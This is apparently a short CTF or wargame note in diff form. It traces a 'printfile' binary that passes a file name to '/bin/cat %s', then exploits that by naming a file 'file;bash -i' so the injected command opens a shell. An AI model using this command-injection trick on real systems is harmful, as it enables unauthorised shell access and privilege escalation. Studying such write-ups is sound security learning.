@@ -1,0 +1,11 @@
+ltrace ./printfile
+...
+access("</your/file>")
+snprintf("/bin/cat </your/file>", 511, "/bin/cat %s", "</your/file>")
+...
+mkdir /tmp/l2 && touch /tmp/l2/'file;bash -i';echo "!!!LOL!!!" > /tmp/l2/file
+~/printfile /tmp/l2/'file;bash -i'
+
+##############
+EASY SHELL !!!
+##############
